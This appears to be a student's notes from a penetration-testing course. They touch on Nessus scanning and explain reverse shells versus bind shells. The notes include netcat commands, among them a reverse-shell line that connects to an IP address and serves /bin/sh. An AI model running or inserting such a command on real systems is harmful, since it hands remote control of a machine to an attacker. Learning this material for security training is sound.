*note that notes for this course start with module 11, which is basically the middle-part of the course, I've previously went over the modules before this one some time ago and I'm now coming back to the course after building up better fundamentals, I strongly recommend this if you feel like the course becomes too complicated or you feel you're not learning enough*

Nessus can scan private addresses, up to 16 at a time (no websites or external hosts)

scans can be scheduled and adjusted for periods (yearly weekly etc)

## Exploitation Basics

### Reverse Shells vs Bind Shells

*Most common Shell (Netcat)*

Used 95% of the time

A shell is access to a machine (pop a shell = get access)

Reverse Shell = a victim connects to us, we're gonna listen

nc -lvp 4444  = listening to port 4444

nc 192.168.1.1 4444 -e /bin/sh = I wanna connect to this IP and when I do that I'm gonna establish this bin shell

*Bind Shell view*

Bind Shell = we open a port on the machine and then we connect to it, we fire of an exploit and that opens up a port

usually an external assesment
